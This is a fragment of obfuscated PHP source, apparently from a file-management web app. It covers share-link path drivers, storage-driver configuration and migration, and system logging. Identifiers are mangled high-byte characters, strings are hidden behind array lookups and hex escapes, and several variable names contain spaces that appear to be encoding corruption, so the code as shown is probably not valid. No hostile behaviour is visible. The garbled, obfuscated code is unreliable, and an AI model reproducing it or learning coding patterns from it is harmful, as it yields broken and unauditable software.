$³É¢·“‹[1340], $³É¢·“‹[564], $³É¢·“‹[566], $³É¢·“‹[1341], $³É¢·“‹[117], $³É¢·“‹[1342], $³É¢·“‹[1343]); if (in_array($ï®û¶¹, $úóÄ›ˆ»)) { $Î‹‘·Åö = $this->getPathOuter($Î‹‘·Åö); } return $Î‹‘·Åö; } public function copy($—Ú˜ğ¦¯, $µÆ×üŸ€, $Û¿êéôÂ = false, $´ùì×ôı = false) { return $this->copyMove($—Ú˜ğ¦¯, $µÆ×üŸ€, $Û¿êéôÂ, $_SERVER[„Ç©ñÎ©][564], $´ùì×ôı); } public function move($°à¡™»Œ, $Ê©´ùº÷, $Ø­¼ä£„ = false, $³ËÄÁü = false) { return $this->copyMove($°à¡™»Œ, $Ê©´ùº÷, $Ø­¼ä£„, $_SERVER[„Ç©ñÎ©][566], $³ËÄÁü); } private function copyMove($¡ïÉ÷˜ë, $™å•„¥Ì, $Ñ’ãïí™, $“ÒŸ¢ö³, $µ©ÉĞ½­ = false) { $Ú›Á¡ò‚ =& $_SERVER[„Ç©ñÎ©]; $’íû²áã = $™å•„¥Ì; $‘÷“’— = IO::driverMake($™å•„¥Ì); if ($‘÷“’—->pathParse[$Ú›Á¡ò‚[1150]]) { $™å•„¥Ì = $‘÷“’—->pathParse[$Ú›Á¡ò‚[1150]]; } else { $™å•„¥Ì = $’íû²áã; } $ÎŠêùæ = IO::copyMove($¡ïÉ÷˜ë, $™å•„¥Ì, $Ñ’ãïí™, $“ÒŸ¢ö³, $µ©ÉĞ½­); $ÎŠêùæ = $this->getPathOuter($ÎŠêùæ); return $ÎŠêùæ; } public function pathThis($®½±î—ù) { return get_path_this($this->pathParse[$_SERVER[„Ç©ñÎ©][94]]); } public function pathFather($üÇ€·éŒ) { return get_path_father($this->pathParse[$_SERVER[„Ç©ñÎ©][94]]); } public function iconvSystem($Îãù“¦) { return $Îãù“¦; } protected function infoParse($û»ÀÛ, $ò¯½ƒİÊ = false) { $îã²ËµĞ =& $_SERVER[„Ç©ñÎ©]; $œä¥øÒÈ = $this->pathParse[$îã²ËµĞ[496]][$îã²ËµĞ[1175]] . $this->pathParse[$îã²ËµĞ[1168]]; if ($ò¯½ƒİÊ) { $èİ¤èöÎ = IO::infoWithChildren($œä¥øÒÈ); } else { $èİ¤èöÎ = IO::info($œä¥øÒÈ); } $½åÖßùá = $this->pathParse[$îã²ËµĞ[496]]; return Action($îã²ËµĞ[1334])->_shareItemeParse($èİ¤èöÎ, $½åÖßùá); } public function listAll($»ï»¦äÜ) { $¸øïÎï =& $_SERVER[„Ç©ñÎ©]; $é¥ã»®× = IO::listAll($»ï»¦äÜ); $òï¨é÷ˆ = $this->pathParse[$¸øïÎï[496]]; foreach ($é¥ã»®× as &$Ø¹ù‘ô) { check_abort(); $õÎŸü÷© = IO::info($Ø¹ù‘ô[$¸øïÎï[94]]); $õÎŸü÷© = is_array($õÎŸü÷©) ? $õÎŸü÷© : array(); $Ø¹ù‘ô = array_merge($õÎŸü÷©, $Ø¹ù‘ô); $Ø¹ù‘ô[$¸øïÎï[96]] = Action($¸øïÎï[1334])->_shareItemeParse($Ø¹ù‘ô, $òï¨é÷ˆ); } unset($Ø¹ù‘ô); return $é¥ã»®×; } public function getPathOuter($ˆãëò¤«) { $Ïğë „¬ =& $_SERVER[„Ç©ñÎ©]; $†‡æÉóÀ = KodIO::parse($ˆãëò¤«); if ($†‡æÉóÀ[$Ïğë „¬[33]] == KodIO::KOD_SHARE_ITEM) { return $†‡æÉóÀ[$Ïğë „¬[94]]; } $ÚíÛş ª = KodIO::clear($ˆãëò¤«); $Œ‘«è®é = KodIO::clear($this->pathParse[$Ïğë „¬[496]][$Ïğë „¬[1175]]); $­·§¶åş = substr($ÚíÛş ª, strlen($Œ‘«è®é)); if (substr($ÚíÛş ª, 0, strlen($Œ‘«è®é)) != $Œ‘«è®é) { return !1; } return $this->pathParse[$Ïğë „¬[1169]] . $Ïğë „¬[8] . ltrim($­·§¶åş, $Ïğë „¬[8]); } public function getType() { $ÇÑÔœÀĞ =& $_SERVER[„Ç©ñÎ©]; $£ü¼ÓŞÉ = str_replace($ÇÑÔœÀĞ[84], $ÇÑÔœÀĞ[12], get_class($this)); return strtolower($£ü¼ÓŞÉ); } public function isTypeObject($Ú¨“Ú¥Œ) { return IO::isTypeObject($Ú¨“Ú¥Œ); } public function info($Ã†±å´“) { return $this->infoParse($Ã†±å´“); } public function infoAuth($­Ûöçò“) { return $this->infoParse($­Ûöçò“); } public function infoWithChildren($…ªáèÅİ) { return $this->infoParse($…ªáèÅİ, !0); } public function infoFull($³œ¬”‡¦) { return $this->infoParse($³œ¬”‡¦); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¹„ó”Â²) { $this->pathParse = $¹„ó”Â²; } protected function infoParse($ôúŠÊÇÂ, $ì¼ëø… = false) { $Ìƒ‚Ú½ø =& $_SERVER[„Ç©ñÎ©]; return Action($Ìƒ‚Ú½ø[1174])->sharePathInfo($this->pathParse[$Ìƒ‚Ú½ø[94]], !0, $ì¼ëø…); } public function listPath($Å Ê¦É³, $À£óúˆ = false) { $ï¸ÈŞùª =& $_SERVER[„Ç©ñÎ©]; $ÍÍ½ê¢ = IO::listPath($Å Ê¦É³, $À£óúˆ); if (!$ÍÍ½ê¢) { return $ÍÍ½ê¢; } if (is_array($ÍÍ½ê¢[$ï¸ÈŞùª[1335]])) { $Êü±ƒ©Î = Action($ï¸ÈŞùª[1344])->parsePathChildren($ÍÍ½ê¢[$ï¸ÈŞùª[1335]], array($ï¸ÈŞùª[430] => $Å Ê¦É³)); $ÍÍ½ê¢[$ï¸ÈŞùª[1335]] = Action($ï¸ÈŞùª[1174])->shareItemInfo($Êü±ƒ©Î); } foreach ($ÍÍ½ê¢ as $Ôú™Ğğ => $ÃêÑƒ) { if (!in_array($Ôú™Ğğ, array($ï¸ÈŞùª[93], $ï¸ÈŞùª[92]))) { continue; } foreach ($ÃêÑƒ as $ÁÎ¡å¡Á => $Êü±ƒ©Î) { $Êü±ƒ©Î = Action($ï¸ÈŞùª[1344])->parsePathChildren($Êü±ƒ©Î, array($ï¸ÈŞùª[430] => $Å Ê¦É³)); $ÍÍ½ê¢[$Ôú™Ğğ][$ÁÎ¡å¡Á] = Action($ï¸ÈŞùª[1174])->shareItemInfo($Êü±ƒ©Î); } } return $ÍÍ½ê¢; } public function listAll($©ã¤à©­) { $Òùö² =& $_SERVER[„Ç©ñÎ©]; $½¥µ×Ëæ = IO::listAll($©ã¤à©­); foreach ($½¥µ×Ëæ as &$×ñßÌ·¦) { $Ï¬ôÂİÆ = IO::info($×ñßÌ·¦[$Òùö²[94]]); $Ï¬ôÂİÆ = is_array($Ï¬ôÂİÆ) ? $Ï¬ôÂİÆ : array(); $×ñßÌ·¦ = array_merge($Ï¬ôÂİÆ, $×ñßÌ·¦); $×ñßÌ·¦[$Òùö²[96]] = Action($Òùö²[1174])->shareItemInfo($×ñßÌ·¦); } unset($×ñßÌ·¦); return $½¥µ×Ëæ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($¿‚£”üÙ) { parent::__construct($¿‚£”üÙ); } } goto Bàì„Êö¥; B¹ÖÎ„ÚÂÚ: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\163\x74\x6f\x72\x61\x67\x65\114\151\163\164"; public $field = array("\x6e\x61\155\x65", "\163\x69\172\x65\x4d\x61\x78", "\x73\171\x73\164\x65\x6d", "\144\145\x66\141\x75\x6c\164", "\x64\x72\x69\166\145\162", "\x63\157\x6e\146\x69\x67"); public function listData($òÂÊ › = false, $Áˆæ = "\155\157\144\x69\146\x79\x54\151\x6d\145", $ê¢’×ç„ = false) { $öšÉº­ğ =& $_SERVER[„Ç©ñÎ©]; $ÓùãŠ‹ = parent::listData($òÂÊ ›, $Áˆæ, $ê¢’×ç„); if ($òÂÊ ›) { return $ÓùãŠ‹; } $ä¯Ø‰£ = $this->ioSizeUseGet(array_to_keyvalue($ÓùãŠ‹, $öšÉº­ğ[12], $öšÉº­ğ[408])); foreach ($ÓùãŠ‹ as $Õ£×†ìø => $ƒçãíîº) { unset($ÓùãŠ‹[$Õ£×†ìø][$öšÉº­ğ[6]]); $ÓùãŠ‹[$Õ£×†ìø][$öšÉº­ğ[1816]] = isset($ä¯Ø‰£[$ƒçãíîº[$öšÉº­ğ[408]]]) ? $ä¯Ø‰£[$ƒçãíîº[$öšÉº­ğ[408]]] : 0; } return $ÓùãŠ‹; } public function ioSizeUseGet($îİ¥¥¬ª) { $„ªÛ©Ú¨ =& $_SERVER[„Ç©ñÎ©]; if (!$îİ¥¥¬ª) { return array(); } $±¢ù©Õ = $„ªÛ©Ú¨[2139] . implode($„ªÛ©Ú¨[50], $îİ¥¥¬ª); $üôæí§· = Cache::get($±¢ù©Õ); if ($üôæí§·) { return $üôæí§·; } $ÌˆÜƒ· = array($„ªÛ©Ú¨[820] => $„ªÛ©Ú¨[408], $„ªÛ©Ú¨[2140] => $„ªÛ©Ú¨[86]); $†ãàâø = array($„ªÛ©Ú¨[820] => array($„ªÛ©Ú¨[7], $îİ¥¥¬ª)); $üôæí§· = Model($„ªÛ©Ú¨[792])->field($ÌˆÜƒ·)->where($†ãàâø)->group($„ªÛ©Ú¨[820])->select(); $üôæí§· = array_to_keyvalue($üôæí§·, $„ªÛ©Ú¨[408], $„ªÛ©Ú¨[86]); Cache::set($±¢ù©Õ, $üôæí§·, 600); return $üôæí§·; } public function getConfig($£õó›‡) { $±«Àß = parent::listData($£õó›‡); return json_decode($±«Àß[$_SERVER[„Ç©ñÎ©][6]], !0); } public function update($üœ‹†ÀÛ, $ƒÒÛöûˆ) { $·ÇŠ‹®¦ =& $_SERVER[„Ç©ñÎ©]; $³€¶„°¼ = $ƒÒÛöûˆ[$·ÇŠ‹®¦[32]]; $Øú¼êå = array_to_keyvalue(parent::listData(), $·ÇŠ‹®¦[32]); if (isset($Øú¼êå[$³€¶„°¼]) && $Øú¼êå[$³€¶„°¼][$·ÇŠ‹®¦[408]] != $üœ‹†ÀÛ) { return !1; } if (!empty($ƒÒÛöûˆ[$·ÇŠ‹®¦[6]])) { $Ê‘Ç‹ğÒ = json_decode($ƒÒÛöûˆ[$·ÇŠ‹®¦[6]], !0); $ô¡É€û = isset($Ê‘Ç‹ğÒ[$·ÇŠ‹®¦[2141]]) ? $·ÇŠ‹®¦[2141] : (isset($Ê‘Ç‹ğÒ[$·ÇŠ‹®¦[2142]]) ? $·ÇŠ‹®¦[2142] : $·ÇŠ‹®¦[12]); if ($ô¡É€û) { $í‰îÂÒ = $this->getConfig($üœ‹†ÀÛ); $ü¤‰Š¡ = $í‰îÂÒ[$ô¡É€û]; $ÔÖçÁœ = $Ê‘Ç‹ğÒ[$ô¡É€û]; if ($ÔÖçÁœ == str_repeat($·ÇŠ‹®¦[198], strlen($ü¤‰Š¡))) { $Ê‘Ç‹ğÒ[$ô¡É€û] = $ü¤‰Š¡; } else { if ($ÔÖçÁœ != $ü¤‰Š¡) { $ƒÒÛöûˆ[$·ÇŠ‹®¦[2143]] = $·ÇŠ‹®¦[98]; } } } } if (isset($ƒÒÛöûˆ[$·ÇŠ‹®¦[2143]]) && $ƒÒÛöûˆ[$·ÇŠ‹®¦[2143]] == $·ÇŠ‹®¦[98]) { $this->checkConfig($ƒÒÛöûˆ); } unset($ƒÒÛöûˆ[$·ÇŠ‹®¦[2143]]); $Æ¯æÄ¥¶ = parent::update($üœ‹†ÀÛ, $ƒÒÛöûˆ); if ($Æ¯æÄ¥¶ && $ƒÒÛöûˆ[$·ÇŠ‹®¦[37]]) { $…ß¶´·ö = 0; foreach ($Øú¼êå as $» €×æõ) { if ($» €×æõ[$·ÇŠ‹®¦[37]] && $» €×æõ[$·ÇŠ‹®¦[408]] != $üœ‹†ÀÛ) { $…ß¶´·ö = $» €×æõ[$·ÇŠ‹®¦[408]]; parent::update($» €×æõ[$·ÇŠ‹®¦[408]], array($·ÇŠ‹®¦[37] => 0)); } } $this->updateBackup($üœ‹†ÀÛ, $…ß¶´·ö); } return $Æ¯æÄ¥¶; } public function add($éí–åÇ) { $ı¿ƒ£¡¹ =& $_SERVER[„Ç©ñÎ©]; $µÆ®®Î· = array_to_keyvalue(parent::listData(), $ı¿ƒ£¡¹[32]); if (isset($µÆ®®Î·[$éí–åÇ[$ı¿ƒ£¡¹[32]]])) { return !1; } $this->checkConfig($éí–åÇ); $÷£ÄîËÁ = parent::insert($éí–åÇ); if ($÷£ÄîËÁ && $éí–åÇ[$ı¿ƒ£¡¹[37]]) { foreach ($µÆ®®Î· as $âÙÍ‰Åş) { if ($âÙÍ‰Åş[$ı¿ƒ£¡¹[37]]) { parent::update($âÙÍ‰Åş[$ı¿ƒ£¡¹[408]], array($ı¿ƒ£¡¹[37] => 0)); } } } return $÷£ÄîËÁ; } public function updateBackup($™ø™àˆÅ, $•±µıõ) { $®»«áƒ =& $_SERVER[„Ç©ñÎ©]; if (!$•±µıõ) { return; } $‚ÑÚ«Ç = Model($®»«áƒ[752])->config(); if ($‚ÑÚ«Ç[$®»«áƒ[1625]] != $®»«áƒ[98] || $‚ÑÚ«Ç[$®»«áƒ[755]] != $•±µıõ) { return; } $ŸãÀ÷¦Ş = Model($®»«áƒ[773])->get($®»«áƒ[783]); $ŸãÀ÷¦Ş = json_decode($ŸãÀ÷¦Ş, !0); if (!$ŸãÀ÷¦Ş) { return; } $ŸãÀ÷¦Ş[$®»«áƒ[755]] = $™ø™àˆÅ; Model($®»«áƒ[773])->set(array($®»«áƒ[783] => $ŸãÀ÷¦Ş)); } public function checkConfig(&$˜À³ªÌ™, $•Ñóïƒ = false) { $·«ûşèÛ =& $_SERVER[„Ç©ñÎ©]; $£ ›ıÈØ = strtolower($˜À³ªÌ™[$·«ûşèÛ[105]]); $ä¿ÒªÖß = json_decode($˜À³ªÌ™[$·«ûşèÛ[6]], !0); foreach ($ä¿ÒªÖß as $§¼Ë€’ò => $úò¶„†±) { $ä¿ÒªÖß[$§¼Ë€’ò] = trim($úò¶„†±); } $ä¿ÒªÖß[$·«ûşèÛ[2144]] = rand_string(6); $šÑ¬ù = $GLOBALS[$·«ûşèÛ[6]][$·«ûşèÛ[99]][$·«ûşèÛ[829]]; $û²ÖÊº = isset($šÑ¬ù[$£ ›ıÈØ]) ? $šÑ¬ù[$£ ›ıÈØ] : ucfirst($£ ›ıÈØ); $ºûÜ›áÕ = $·«ûşèÛ[84] . $û²ÖÊº; if (!$û²ÖÊº || !class_exists($ºûÜ›áÕ)) { if ($•Ñóïƒ) { return LNG($·«ûşèÛ[2145]); } write_log(array($·«ûşèÛ[2146], $˜À³ªÌ™, get_caller_info()), $·«ûşèÛ[2147]); show_json(LNG($·«ûşèÛ[2145]), !1, $˜À³ªÌ™); } $ëå³ßÛ˜ = new $ºûÜ›áÕ($ä¿ÒªÖß); if (in_array($£ ›ıÈØ, $ëå³ßÛ˜->objectDriver)) { if (!$ëå³ßÛ˜->isBucketCors() && !$ëå³ßÛ˜->setBucketCors()) { $ğÜ„íì = LNG($·«ûşèÛ[2148]); $ğÜ„íì .= $·«ûşèÛ[2149] . LNG($·«ûşèÛ[2150]); if ($•Ñóïƒ) { return $ğÜ„íì; } show_json($ğÜ„íì, !1); } } $ˆ•›Ú‰¦ = rtrim($ä¿ÒªÖß[$·«ûşèÛ[1180]], $·«ûşèÛ[8]) . $·«ûşèÛ[8]; $ïõÏ„ = $ëå³ßÛ˜->getPath($ˆ•›Ú‰¦ . $·«ûşèÛ[1242]); if (!$ëå³ßÛ˜->mkfile($ïõÏ„)) { if ($•Ñóïƒ) { return LNG($·«ûşèÛ[2148]); } show_json(LNG($·«ûşèÛ[2148]), !1); } $ä¿ÒªÖß[$·«ûşèÛ[1180]] = $ˆ•›Ú‰¦; $˜À³ªÌ™[$·«ûşèÛ[6]] = json_encode($ä¿ÒªÖß); $˜À³ªÌ™[$·«ûşèÛ[105]] = $û²ÖÊº; return !0; } public function driverListSystem() { $šå°ª¤ =& $_SERVER[„Ç©ñÎ©]; $çÄƒ«¸Æ = parent::listData(); $ßöÛÆ = array(); foreach ($çÄƒ«¸Æ as $‹”°•é×) { unset($‹”°•é×[$šå°ª¤[210]], $‹”°•é×[$šå°ª¤[95]]); $‹”°•é×[$šå°ª¤[6]] = json_decode($‹”°•é×[$šå°ª¤[6]], !0); $ßöÛÆ[] = $‹”°•é×; } return $ßöÛÆ; } public function defaultDriver() { $õŞÆùéØ =& $_SERVER[„Ç©ñÎ©]; $íÉ¡ó«¶ = parent::listData(); $Ÿç†÷¦ = array_filter_by_field($íÉ¡ó«¶, $õŞÆùéØ[37], 1); $Ÿç†÷¦ = $Ÿç†÷¦[0]; if ($Ÿç†÷¦) { $Ÿç†÷¦[$õŞÆùéØ[6]] = json_decode($Ÿç†÷¦[$õŞÆùéØ[6]], !0); } return $Ÿç†÷¦; } public function driverInfo($Â¨ıØ‘™) { $…ú¸õçÆ =& $_SERVER[„Ç©ñÎ©]; $ŠÆ‹¼½Î = array_to_keyvalue(parent::listData(), $…ú¸õçÆ[408]); if (!isset($ŠÆ‹¼½Î[$Â¨ıØ‘™])) { return !1; } $í¸à­ = $ŠÆ‹¼½Î[$Â¨ıØ‘™]; $í¸à­[$…ú¸õçÆ[6]] = json_decode($í¸à­[$…ú¸õçÆ[6]], !0); return $í¸à­; } public function remove($§š‚¯Ù) { $this->removeShareItems($§š‚¯Ù); return parent::remove($§š‚¯Ù); } public function removeWithFile($ş¤ş­’, $Ğ™Ãòè) { $²ºë˜¡¶ =& $_SERVER[„Ç©ñÎ©]; $†İïƒÎõ = array($²ºë˜¡¶[820] => $ş¤ş­’); $ó»Òôî¤ = Model($²ºë˜¡¶[480])->where($†İïƒÎõ)->count(); $¸§Ü¶ü = Model($²ºë˜¡¶[480])->where($†İïƒÎõ)->sum($²ºë˜¡¶[86]); $ú™—³¿ = $Ğ™Ãòè . $²ºë˜¡¶[2151] . $ş¤ş­’; $’Ï³ò£° = LNG($Ğ™Ãòè == $²ºë˜¡¶[566] ? $²ºë˜¡¶[2152] : $²ºë˜¡¶[2153]); $èŠ÷å“İ = new TaskFileTransfer($ú™—³¿, $²ºë˜¡¶[2147], $ó»Òôî¤, $’Ï³ò£° . "\50{$ş¤ş­’}\x29"); $èŠ÷å“İ->task[$²ºë˜¡¶[766]] = (double) $¸§Ü¶ü; $á½—ïÒ¹ = KodIO::defaultDriver(); $ºƒâ€ùï = $á½—ïÒ¹[$²ºë˜¡¶[408]]; $Éäùèû = "\173\151\157\x3a{$ºƒâ€ùï}\x7d\57"; $€âÍú = !0; $ç“éÓ˜½ = array(); $íÁ†¨áè = Model($²ºë˜¡¶[209])->where($†İïƒÎõ)->field($²ºë˜¡¶[2154])->select(); foreach ($íÁ†¨áè as $ç¡„Î„à) { $ñº¾Œ = $ç¡„Î„à[$²ºë˜¡¶[94]]; $ƒÓ²÷ìÑ = $Éäùèû . str_replace("\173\151\157\x3a{$ş¤ş­’}\175\x2f", $²ºë˜¡¶[12], $ñº¾Œ); if (!IO::exist($ñº¾Œ)) { $ç“éÓ˜½[] = $ç¡„Î„à[$²ºë˜¡¶[477]]; $èŠ÷å“İ->updateFileEnd($ç¡„Î„à[$²ºë˜¡¶[32]], $ç¡„Î„à[$²ºë˜¡¶[86]]); continue; } if (IO::exist($ƒÓ²÷ìÑ)) { $èŠ÷å“İ->updateFileEnd($ç¡„Î„à[$²ºë˜¡¶[32]], $ç¡„Î„à[$²ºë˜¡¶[86]]); continue; } if (!IO::move($ñº¾Œ, get_path_father($ƒÓ²÷ìÑ))) { $€âÍú = !1; break; } $†İïƒÎõ = array($²ºë˜¡¶[477] => $ç¡„Î„à[$²ºë˜¡¶[477]]); $ì’¢¢· = array($²ºë˜¡¶[820] => $ºƒâ€ùï, $²ºë˜¡¶[94] => $ƒÓ²÷ìÑ); Model($²ºë˜¡¶[209])->where($†İïƒÎõ)->save($ì’¢¢·); } $this->removeByFileID($ç“éÓ˜½); if (!$€âÍú) { $èŠ÷å“İ->stop($ú™—³¿); return !1; } $èŠ÷å“İ->end(); if ($Ğ™Ãòè == $²ºë˜¡¶[1796]) { $this->remove($ş¤ş­’); } } public function progress($Öîòèº, $ÁŞ™±ğ ) { return Task::get($ÁŞ™±ğ  . $_SERVER[„Ç©ñÎ©][2151] . $Öîòèº); } private function removeByFileID($Î×şşêğ = array()) { $±³ñ´óÂ =& $_SERVER[„Ç©ñÎ©]; if (empty($Î×şşêğ)) { return; } $ìÔ©ÚŸÏ = array($±³ñ´óÂ[477] => array($±³ñ´óÂ[7], $Î×şşêğ)); $Øº¹ñúØ = Model($±³ñ´óÂ[1326])->where($ìÔ©ÚŸÏ)->field($±³ñ´óÂ[411])->select(); if (!$Øº¹ñúØ) { return; } $Øº¹ñúØ = array_to_keyvalue($Øº¹ñúØ, $±³ñ´óÂ[12], $±³ñ´óÂ[411]); foreach ($Øº¹ñúØ as $ã«‰ïÍ¡) { Model($±³ñ´óÂ[425])->removeNow($ã«‰ïÍ¡, !1); } } private function removeShareItems($£¨‡æÁ) { $è‘­Üü¬ =& $_SERVER[„Ç©ñÎ©]; $·ÁÈ ² = "\173\x69\x6f\x3a{$£¨‡æÁ}\x7d\x2f"; $¥ç‡› = array($è‘­Üü¬[411] => 0, $è‘­Üü¬[1175] => array($è‘­Üü¬[392], "{$·ÁÈ ²}\x25")); $‡ıñÁšÚ = Model($è‘­Üü¬[1807])->where($¥ç‡›)->field($è‘­Üü¬[498])->select(); if (empty($‡ıñÁšÚ)) { return; } $›˜è¼ûí = array_to_keyvalue($‡ıñÁšÚ, $è‘­Üü¬[12], $è‘­Üü¬[498]); Model($è‘­Üü¬[610])->remove($›˜è¼ûí); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\114\x69\147\x68\164\101\x70\160"; public $modelType = "\123\x79\163\164\x65\155\x4f\x70\164\151\x6f\156"; public $field = array("\156\141\155\x65", "\x67\162\x6f\165\160", "\144\145\163\x63", "\143\x6f\x6e\164\x65\156\x74"); public function listData($í¬Ù²ÙÔ = false, $¢§Ø’÷´ = "\x6d\x6f\144\151\x66\x79\124\151\155\145", $È¼µ¾Ş• = true) { return parent::listData($í¬Ù²ÙÔ, $¢§Ø’÷´, $È¼µ¾Ş•); } public function remove($–¹™ÙÉ½) { $â´ç„‰› = $this->findByName($–¹™ÙÉ½); if (!$â´ç„‰›) { return !1; } return parent::remove($â´ç„‰›[$_SERVER[„Ç©ñÎ©][408]]); } public function add($›ı¬çô—) { if ($this->findByName($›ı¬çô—[$_SERVER[„Ç©ñÎ©][32]])) { return !1; } return parent::insert($›ı¬çô—); } public function update($”Ò¾…ì, $ ÊéğÍ÷) { $è¾‘ñèë =& $_SERVER[„Ç©ñÎ©]; $—€ÌÄÑª = $this->findByName($”Ò¾…ì); $ğ¥¦ì¿Ó = $this->findByName($ ÊéğÍ÷[$è¾‘ñèë[32]]); if (!$—€ÌÄÑª || $ğ¥¦ì¿Ó && $ğ¥¦ì¿Ó[$è¾‘ñèë[408]] != $—€ÌÄÑª[$è¾‘ñèë[408]]) { return !1; } return parent::update($—€ÌÄÑª[$è¾‘ñèë[408]], $ ÊéğÍ÷); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\137\x6c\x6f\147"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\124\x69\155\145", "\164\151\155\145", "\151\x6e\x73\x65\x72\164", "\146\165\x6e\143\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¤‡Å¢å€ =& $_SERVER[„Ç©ñÎ©]; return array($¤‡Å¢å€[2155] => LNG($¤‡Å¢å€[2156]), $¤‡Å¢å€[2157] => LNG($¤‡Å¢å€[2158]), $¤‡Å¢å€[1770] => LNG($¤‡Å¢å€[2159]), $¤‡Å¢å€[2160] => LNG($¤‡Å¢å€[2161]), $¤‡Å¢å€[2162] => LNG($¤‡Å¢å€[2163]), $¤‡Å¢å€[2164] => LNG($¤‡Å¢å€[2165]), $¤‡Å¢å€[2166] => LNG($¤‡Å¢å€[2167]), $¤‡Å¢å€[1800] => LNG($¤‡Å¢å€[2167]), $¤‡Å¢å€[1801] => LNG($¤‡Å¢å€[2168]), $¤‡Å¢å€[2169] => LNG($¤‡Å¢å€[2170]), $¤‡Å¢å€[2171] => LNG($¤‡Å¢å€[2172]), $¤‡Å¢å€[2173] => LNG($¤‡Å¢å€[2174]), $¤‡Å¢å€[2175] => LNG($¤‡Å¢å€[2176]), $¤‡Å¢å€[1798] => LNG($¤‡Å¢å€[2177]), $¤‡Å¢å€[2178] => LNG($¤‡Å¢å€[2179]), $¤‡Å¢å€[1805] => LNG($¤‡Å¢å€[2180]), $¤‡Å¢å€[2181] => LNG($¤‡Å¢å€[2182]), $¤‡Å¢å€[2183] => LNG($¤‡Å¢å€[2184]), $¤‡Å¢å€[2185] => LNG($¤‡Å¢å€[2186]), $¤‡Å¢å€[2187] => LNG($¤‡Å¢å€[2188]), $¤‡Å¢å€[1808] => LNG($¤‡Å¢å€[2189]), $¤‡Å¢å€[1809] => LNG($¤‡Å¢å€[2190]), $¤‡Å¢å€[2191] => LNG($¤‡Å¢å€[2192]), $¤‡Å¢å€[2193] => LNG($¤‡Å¢å€[2194]), $¤‡Å¢å€[2195] => LNG($¤‡Å¢å€[2196]), $¤‡Å¢å€[1803] => LNG($¤‡Å¢å€[2197]), $¤‡Å¢å€[2198] => LNG($¤‡Å¢å€[2199]), $¤‡Å¢å€[1802] => LNG($¤‡Å¢å€[2200]), $¤‡Å¢å€[2201] => LNG($¤‡Å¢å€[2202]), $¤‡Å¢å€[2203] => LNG($¤‡Å¢å€[2204]), $¤‡Å¢å€[2205] => LNG($¤‡Å¢å€[2206]), $¤‡Å¢å€[2207] => LNG($¤‡Å¢å€[2207]), $¤‡Å¢å€[2208] => LNG($¤‡Å¢å€[1774]), $¤‡Å¢å€[2209] => LNG($¤‡Å¢å€[2210]), $¤‡Å¢å€[2211] => LNG($¤‡Å¢å€[2212]), $¤‡Å¢å€[2213] => LNG($¤‡Å¢å€[2214]), $¤‡Å¢å€[2215] => LNG($¤‡Å¢å€[2216]), $¤‡Å¢å€[2217] => LNG($¤‡Å¢å€[2218]), $¤‡Å¢å€[2219] => LNG($¤‡Å¢å€[2219]), $¤‡Å¢å€[2220] => LNG($¤‡Å¢å€[2221]), $¤‡Å¢å€[2222] => LNG($¤‡Å¢å€[2223]), $¤‡Å¢å€[2224] => LNG($¤‡Å¢å€[2225]), $¤‡Å¢å€[2226] => LNG($¤‡Å¢å€[2227]), $¤‡Å¢å€[2228] => LNG($¤‡Å¢å€[2229]), $¤‡Å¢å€[2230] => LNG($¤‡Å¢å€[2231])); } private function typeFile() { $çáÚïÌ¸ =& $_SERVER[„Ç©ñÎ©]; $ÊÍƒ£Àë = array($çáÚïÌ¸[1805] => array($çáÚïÌ¸[1806]), $çáÚïÌ¸[2173] => array($çáÚïÌ¸[2232]), $çáÚïÌ¸[2175] => array($çáÚïÌ¸[2233]), $çáÚïÌ¸[1798] => array($çáÚïÌ¸[1799]), $çáÚïÌ¸[2183] => array(), $çáÚïÌ¸[2185] => array(), $çáÚïÌ¸[2187] => array(), $çáÚïÌ¸[1808] => array($çáÚïÌ¸[1810]), $çáÚïÌ¸[1809] => array($çáÚïÌ¸[1810]), $çáÚïÌ¸[2191] => array($çáÚïÌ¸[2234]), $çáÚïÌ¸[2193] => array($çáÚïÌ¸[2234]), $çáÚïÌ¸[2195] => array($çáÚïÌ¸[2235]), $çáÚïÌ¸[2181] => array($çáÚïÌ¸[2236]), $çáÚïÌ¸[1803] => array($çáÚïÌ¸[2237]), $çáÚïÌ¸[2198] => array($çáÚïÌ¸[2238]), $çáÚïÌ¸[1802] => array($çáÚïÌ¸[1804])); return $ÊÍƒ£Àë; } private function typeAll() { $’¡˜­‡ñ =& $_SERVER[„Ç©ñÎ©]; $ÂáşêÕä = $this->typeList; $ñ‡ì¤®Æ = array_filter($this->typeFile()); foreach ($ñ‡ì¤®Æ as $¿¬Ö“”ß => $ÛĞ´Æê) { $ÂáşêÕä[$ÛĞ´Æê[0]] = $ÂáşêÕä[$¿¬Ö“”ß]; } $ÂáşêÕä[$’¡˜­‡ñ[1810]] = LNG($’¡˜­‡ñ[2239]); $ÂáşêÕä[$’¡˜­‡ñ[2234]] = LNG($’¡˜­‡ñ[2240]); return $ÂáşêÕä; } public function addLog($ë‚«şÍ, $®ì·ëõ‹ = array()) { $â­çóŸÄ =& $_SERVER[„Ç©ñÎ©]; if (!isset($this->typeList[$ë‚«şÍ])) { return; } $µ­¯îÖ = defined($â­çóŸÄ[484]) && USER_ID ? USER_ID : (isset($®ì·ëõ‹[$â­çóŸÄ[1655]]) ? $®ì·ëõ‹[$â­çóŸÄ[1655]] : 0); if (!$µ­¯îÖ) { $µ­¯îÖ = (int) Session::get($â­çóŸÄ[1964]); } if ($ë‚«şÍ == $â­çóŸÄ[2209] && is_array($®ì·ëõ‹[$â­çóŸÄ[2241]]) && !$®ì·ëõ‹[$â­çóŸÄ[2241]]) { return; } $Â„Ë†Å = get_client_ip(); if (!$®ì·ëõ‹ || strlen(json_encode($®ì·ëõ‹)) >= 1024) { $®ì·ëõ‹ = array($â­çóŸÄ[2242] => $Â„Ë†Å); } else { if (is_array($®ì·ëõ‹)) { $®ì·ëõ‹[$â­çóŸÄ[2242]] = $Â„Ë†Å; } else { $®ì·ëõ‹ = array($â­çóŸÄ[1192] => $®ì·ëõ‹, $â­çóŸÄ[2242] => $Â„Ë†Å); } } $®ì·ëõ‹ = array($â­çóŸÄ[1645] 